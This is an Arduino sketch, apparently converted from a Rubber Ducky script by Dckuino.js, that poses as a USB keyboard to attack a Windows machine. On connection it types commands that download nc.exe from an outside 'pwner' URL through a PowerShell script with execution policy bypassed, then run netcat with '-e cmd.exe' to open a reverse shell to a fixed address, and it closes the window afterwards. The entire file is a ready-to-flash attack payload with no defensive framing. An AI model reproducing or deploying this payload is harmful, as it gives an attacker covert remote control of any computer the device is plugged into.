/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void typeKey(int key)
{  
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  
  // For VM
  delay(10000);
  
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(400);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("cd / & mkdir win & cd win & echo (new-object System.Net.WebClient).DownloadFile('https://vikas.guru/pwner/nc.exe','C:\\win\\a.exe') > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("START /MIN a.exe 192.168.1.201 8055 -e cmd.exe -d & exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
